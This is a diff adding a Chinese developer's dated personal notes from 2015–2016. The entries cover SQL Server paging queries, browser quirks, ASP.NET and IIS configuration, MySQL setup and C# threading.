+SELECT a.* FROM t_BeianSubject AS a INNER JOIN (
+	SELECT TOP 3030 ID, ROW_NUMBER() OVER (ORDER BY CreateTime DESC) AS n FROM t_BeianSubject ORDER BY CreateTime DESC
+) AS b ON a.ID = b.ID AND b.n > 3000 ORDER BY b.n ASC
+GO
+-- 方法3：SQL 2005以上版本通用
+SELECT * FROM (
+	SELECT TOP 3030 *, ROW_NUMBER() OVER (ORDER BY CreateTime DESC) AS n FROM t_BeianSubject ORDER BY CreateTime DESC
+) AS a WHERE a.n > 3000
+GO
+-- 方法4：通用
+SELECT b.* FROM (
+	SELECT TOP 30 * FROM (
+		SELECT TOP 3030 * FROM t_BeianSubject ORDER BY CreateTime DESC
+	) AS a ORDER BY a.CreateTime ASC
+) AS b ORDER BY b.CreateTime DESC
+GO
+-- 方法5：必须具有一个主键列
+SELECT TOP 30 * FROM t_BeianSubject WHERE ID NOT IN (
+	SELECT TOP 3000 ID FROM t_BeianSubject ORDER BY CreateTime DESC
+) ORDER BY CreateTime DESC
+
+2015-7-2
+js创建Option时，调用new Option(text, value, defaultSelected)，发现在Chrome浏览器中并未正确设置默认选择的项。
+解决办法：调用Option的完全构造函数 new Option(text, value, defaultSelected, selected)，问题解决。
+
+2015-8-14
+不能依赖HttpWebResponse.CharacterSet属性获取返回内容的字符集，因为当返回的Content-Type标头内容不包含charset时，该属性将返回ISO-8859-1，这将导致解析中文页面乱码。
+
+2015-08-31
+EcShop的用户密码保存在ecs_admin_user.password字段中，加密方式如下：32位MD5加密(32位MD5加密(明文)+ecs_admin_user.salt的值)。
+
+2015-9-30【重要】
+避免使用<form action="" method="post">的方式来向当前页面回发请求，因为发现在IE11中form.action属性的返回值不正确。
+例如：下面的页面：
+<iframe width="1336" height="582" src="/Xphter.SiteBuilder.Portal/Manage/OemModule/Order/Flow/16098" frameborder="0" marginwidth="0" marginheight="0" style="margin: 0px; padding: 0px; visibility: visible;"></iframe>
+在iframe引用的页面中，存在代码：<form action="" method="post" enctype="application/x-www-form-urlencoded"></form>
+在iframe调用的页面中访问form.action属性时，返回值是：/Xphter.SiteBuilder.Portal/Manage/OemModule/Order/Flow/，这将导致回发时丢失参数，这是不正确的！
+
+2015-10-13【重要】
+使浏览器下载文件，需要发送的HTTP头如下：
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="value"; filename*=utf-8''value
+其中value是经过UTF8编码的文件名，且必须具有英文后缀。
+
+2015-10-29【重要】
+ASP.NET MVC4中需要格式化显示的时候，使用下面的方法：
+@this.Html.TextBoxFor((model) => model.Amount, "{0:0.####}")
+
+2015-11-11
+暴风影音不能播放.rmvb文件的解决方法：下载realcodec，解压rplsp目录到c:\users\public\文件夹。
+
+2015-11-13
+1. window.document.images和element.getElementsByTagName("img")返回的数组是活动的，会根据DOM树的变化而更改；
+2. 检测元素是否存在某属性，IE8之前的IE需要用element.getAttributeNode方法，其他浏览器支持标准的element.hasAttribute方法；
+
+2015-11-18
+HTML5中隐藏滚动条的方法：
+水平：html, body { overflow-x: hidden; }
+垂直：html, body { overflow-y: hidden; }
+全部：html, body { overflow: hidden; }
+
+2015-11-19【重要】
+获取一个类显式实现的属性或方法的办法：
+属性：tClass.GetProperty(string.Format("{0}.{1}", tInterface.FullName, propertyName), BindingFlags.NonPublic | BindingFlags.Instance);
+方法：tClass.GetMethod(string.Format("{0}.{1}", tInterface.FullName, methodName), BindingFlags.NonPublic | BindingFlags.Instance);
+
+2015-11-20【重要】
+在SATA硬盘的电脑上安装XP的方法：
+01. 下载并解压 WinSetupFromUSB
+02. 运行WinSetupFromUSB
+03. 点击 RMPrepUSB，进行引导准备窗口
+04. 在3 BootOption栏目中选择XP/BartPE bootable[NTLDR]，在4 FILESYSTEM and OVERRIDES中选择NTFS和BOOT as HDD，然后点击6 Prepare Drive
+05. 点击OK，等待命令行窗口运行完毕关闭后，点击Exit退出引导准备窗口；
+06. 将XP安装镜像加载到虚拟光驱
+07. 勾选Windows 2000/XP/2003 Setup
+08. 浏览目录选择6中的虚拟光驱
+09. 点击GO，开始制作安装介质
+10. 从USB设备启动电脑
+11. 选择 Windows XP/2000/2003 Setup，敲回车
+12. 选择First Part of Windows XP ...，敲回车
+13. 选择Sencond Part of Windows XP ...，敲回车
+14. 拔出U盘，硬盘启动
+15. 结束
+
+2015-12-9【重要】
+如何在SQL SERVER中查询满足下面条件的数据呢：用户输入的关键词包含指定列中的值
+使用函数进行查询：SELECT * FROM t_TableName WHERE CHARINDEX(ColumnName, N'关键词') > 0
+
+2015-12-11【重要】
+测试PHP5.6时，运行php -v，一直提示“缺少msvcr110.dll”，即使安装了VC11 x64依然出错；
+解决办法：安装VC11 x86，问题解决；
+
+2015-12-11【重要】
+免安装版MYSQL的安装步骤；
+1. 复制 my-default.ini 为 my.ini；
+2. 设置 my.ini 中 basedir、datadir、port等参数的值；
+3. 初始化data文件夹，执行：mysqld --initialize --console，记录下root的随机密码；
+4. 安装MYSQL服务，执行：mysqld --install MysqlX.X.X --defaults-file="...\my.ini"；
+5. 启动MYSQL服务器，并使用3中的密码登陆，执行：mysql -uroot -p3中的密码；
+6. 修改root密码，执行：set password = password('新密码');
+7. 重启启动MYSQL服务；
+8. 安装完毕；
+
+2016-1-11【重要】
+DIV等块级元素只包含一个IMG时下边缘出现空白的解决办法
+现象：HTML4\5中，下面的代码：<div><img src="图片地址" /></div>，在浏览器中DIV的高度会比IMG的高度大，导致出现了空白行。
+原因：图片默认是与块级元素中的内联元素的下边距对齐的，也就是baseline，CSS2文档是这么解释的：一个inline-block元素，如果里面没有inline元素，或者overflow不是visible，则该元素的基线就是其margin底边缘，否则，其基线就是元素里面最后一行内联元素的基线。
+解决：方法1：将IMG设置为块级元素（display: block）；方法2：设置IMG的对齐方式不是baseline（vertical-align: top）；方法3：将内联基线设置的比IMG小（font-size: 0px或line-height: 0px）
+
+2016-1-11【重要】
+PHP5.3之前的ZEND叫做ZendOptimizer，并且PHP版本必须是TS版本。
+
+2016-2-18
+SQL中判断数据是否存在的方法，效率比较：1 > 2 > 3：
+1. SELECT 1 WHERE EXISTS(SELECT 1 FROM tableName WHERE condition)，判断是否存在输出；
+2. SELECT TOP 1 1 FROM tableName WHERE condition，判断是否存在输出；
+3. SELECT COUNT(*) FROM tableName WHERE condition，判断数量是否大于零；
+
+2016-3-4
+SQL SERVER中获取表聚集索引分页情况并保存到新创建表的代码：
+DBCC TRACEON(3604, 2588)
+GO
+--DBCC IND ('databaseName', 'tableName', 1)
+GO
+DECLARE @T1 TABLE(
+	PageFID int,
+	PagePID int,
+	IAMFID int null,
+	IAMPID int null,
+	ObjectID int,
+	IndexID int,
+	PartitionNumber int,
+	PartitionID bigint,
+	iam_chain_type varchar(20),
+	PageType int,
+	IndexLevel int null,
+	NextPageFID int,
+	NextPagePID int,
+	PrevPageFID int,
+	PrevPagePID int)
+INSERT INTO @T1 EXECUTE('DBCC IND (''databaseName'', ''tableName'', 1)')
+SELECT * INTO t_IndexPages FROM @T1
+
+查看分页详细情况的代码：DBCC PAGE('databaseName', fileID, pageID, 3)
+
+通过对索引结构的分析，选择聚集索引键时，最好创建唯一聚集索引：CREATE UNIQUE CLUSTERED INDEX ...
+
+2016-3-12【重要】
+i5 430M的笔记本，操作系统WIN10，打开securable，提示CPU不支持 Intel Hardware Virtualization Technology。
+解决办法：启动系统时，不要启动 hyper-v。
+
+2016-3-14【重要】
+获取微信公众号二维码的方法：http://open.weixin.qq.com/qr/code/?username={公众号微信号}
+例如：http://open.weixin.qq.com/qr/code/?username=beianchaxun8
+
+2016-3-20【重要】
+HTML5时代可以使用<input name="files" type="file" multiple="multiple" />来上传多个文件，使用FileReader类来预览文件。
+Xphter SiteBuilder中已经应用该技术，API参考：https://www.w3.org/TR/FileAPI
+
+2016-3-22
+关闭HTTP访问并重启SQL SERVER，然后开启HTTP访问的脚本：
+netsh advfirewall firewall set rule group="万维网服务(HTTP)" new enable=no
+ping 127.0.0.1 -n 10
+net stop MSSQL$MSSQLSERVER2008
+ping 127.0.0.1 -n 5
+net start MSSQL$MSSQLSERVER2008
+ping 127.0.0.1 -n 10
+netsh advfirewall firewall set rule group="万维网服务(HTTP)" new enable=yes
+其中的防火墙组名称和SQL SERVER服务名称，根据具体服务器配置决定。
+
+2016-4-25【重要】
+设计经验：当考虑把一个属性设置为枚举值时，若判断枚举值后执行的操作所需的信息不需要其他组件提供，则可以将枚举替换为接口，每个枚举值用一个类来实现，这有利于系统扩展性。
+
+2016-4-28
+SQL SERVER中NULL不能和其他数据类型进行算术、比较和聚集运算，所以不能在IN和NOT IN中使用NULL值；
+
+2016-6-27【重要】
+在IIS中部署ASP.NET 4.0网站时，提示错误：
+Could not load type 'System.ServiceModel.Activation.HttpModule' from assembly 'System.ServiceModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+
+This error can occur when IIS is installed after installing .NET Framework 4, or if the 3.0 version of the WCF Http Activation module is installed after installing IIS and .NET Framework 4.
+To resolve this problem, you must use the ASP.NET IIS Registration Tool (Aspnet_regiis.exe,) to register the correct version of ASP.NET. This can be accomplished by using the –iru parameters when running aspnet_regiis.exe as follows:
+aspnet_regiis.exe -iru
+
+2016-7-6【重要】
+C#中匿名方法捕获外部变量的实现原理：
+编辑器会生成一个自动类，类的公开字段名称与匿名方法中引用的所有外部变量的名称一一对应；
+代码中所有对这些外部变量的初始化和引用，都将转变为对该自动类的公开字段的访问。
+
+2016-8-12
+在线制作loading图片的网站：http://www.ajaxload.info
+
+2016-9-20
+移除ASP.NET默认HTTP响应标头的方法
+1. 移除 X-AspNet-Version：<httpRuntime enableVersionHeader="false" />
+2. 移除 X-AspNetMvc-Version：MvcHandler.DisableMvcResponseHeader = true;
+3. 移除 X-Powered-By：在IIS Manager的HTTP Response Headers中移除X-Powered-By；
+   或者在web.config中增加下面的代码：
+        <httpProtocol>
+            <customHeaders>
+                <remove name="X-Powered-By" />
+            </customHeaders>
+        </httpProtocol>
+4. 移除 Server：创建IHttpModule类，响应PreSendRequestHeaders事件，context.Response.Headers.Remove("Server")；
+
+2016-10-10
+SQL SERVER 内存管理：
+http://www.cnblogs.com/CareySon/archive/2012/04/25/2470063.html
+http://www.cnblogs.com/CareySon/archive/2012/08/16/HowSQLServerManageMemory.html
+
+2016-10-24【重要】
+在多线程中使用 ICollection<T> 和 IDictionary<Key, Value> 时，需要进行同步，否则会出现数据错误；
+经过测试，Dictionary<Key, Value>.ContainsKey 方法在大部分情况吓可以放心使用，使用下面的代码可以解决 Dictionary 多线程读取、增加（不支持删除）的同步问题：
+
+private TValue result;
+private volatile int m_isAdding;
+
+if(!this.m_cache.ContainsKey(key)) {
+    lock(((ICollection) this.m_cache).SyncRoot) {
+        if(!this.m_cache.ContainsKey(key)) {
+            // execute operation to create value
+            value = "123";
+
+            this.m_isAdding = 1;
+            this.m_cache[key] = result = value;
+            this.m_isAdding = 0;
+        }
+    }
+}
+
+if(result == null) {
+    SpinWait.SpinUntil(() => this.m_isAdding == 0);
+    result = this.m_cache[key];
+}
+
+上面的代码即保证了读取时的性能（不加锁），也保证了每个key的值只产生一次；
+
+注意：IDictionary<Key, Value>.ContainsKey 方法并不是线程安全的，当有其他线程正在增加字典项的时候，可能会返回错误的值，导致无法索引器抛出异常；
+将上面代码中的 this.m_cache 切换为 ConcurrentDictionary 后，就可以去掉自旋检测，并保证绝对的线程安全，但性能下降；
+
+2016-11-3【重要】
+在大量文件操作的场景中，尽量考虑对文件进行异步读写操作。
+
+2016-11-5【重要】
+原子操作和线程同步：
+1. 所有的VolatileRead方法都执行一个包含获取语义的读取操作，这些方法读取由参数address引用的值，然后使得CPU高速缓存内的相应字节失效。
+2. 所有的VolatileWrite方法则执行一个包含释放语义的写入操作，这些方法将CPU高速缓存内的字节刷到内存中，然后将address参数引用的值修改为value参数所表示的值。
+3. MemoryBarrier方法则执行一个内存栅栏，将CPU高速缓存内的字节刷到内存中，然后使CPU的高速缓存内的相应字节失效。
+4. C#编译器提供了volatile关键字，该关键字可以用于下述类型的静态/实例字段：byte，sbyte，short，ushort，int，uint，char，float和bool。此外，我们还可以将volatile关键字应用于引用类型以及枚举类型的基础类型是byte，sbyte，short，ushot，int，uint，float和bool的枚举字段。volatile关键字告诉C#和JIT编译器不再在CPU寄存器中缓存字段，从而确保字段的所有读写操作都是对内存的读写，JIT编译器则确保其语义正确，这样就不必显式调用Thread的静态方法VolatileXXX了。
+参考：http://blog.csdn.net/u011190993/article/details/38679245
+参考：http://www.cnblogs.com/xiashengwang/archive/2012/08/25/2655774.html
+
+2016-11-14【重要】
+ASP.NET MVC中的错误处理：
+1. <customErrors mode="On"></customErrors>、定义HandleErrorAttribute：未引发 Application_Error，显示 HandleErrorAttribute 中定义的错误视图；
+2. <customErrors mode="On"></customErrors>、未定义HandleErrorAttribute：引发 Application_Error，显示 defaultRedirect 中的页面，若未定义  defaultRedirect 则显示配置错误；
+3. <customErrors mode="Off"></customErrors>、定义HandleErrorAttribute：引发 Application_Error，默认显示 ASP.NET 错误页面；
+4. <customErrors mode="Off"></customErrors>、未定义HandleErrorAttribute：引发 Application_Error，默认显示 ASP.NET 错误页面；
+
+IIS7 中的错误处理：
+5. <httpErrors errorMode="DetailedLocalOnly"></httpErrors>：此为IIS默认配置，对于远程访问，将显示 IIS 自定义错误页面；
+6. <httpErrors errorMode="Detailed"></httpErrors>：对于本地和远程访问，始终显示详细错误信息，即禁用 IIS 自定义错误页面；
+7. <httpErrors errorMode="Custom"></httpErrors>：对于本地和远程访问，始终显示 IIS 自定义错误页面；
+
+需要输出自己的错误页面内容，可以响应 Application_Error 事件，，并配置 <httpErrors errorMode="Detailed"></httpErrors>（或者设置 HttpResponse.TrySkipIisCustomErrors 属性值为 true），代码参见 Xphter.ReverseProxy（基于错误页面文件的实现） 和 Xphter.SiteBuilder（基于主体模板的实现）。
+注意：若使用 HttpResponse.OutputStream 写入错误页面内容，系统仍然显示默认的 ASP.NET 错误页面内容，具体原因不清楚；
+
+参考文章：http://www.cnblogs.com/TiestoRay/p/4723996.html
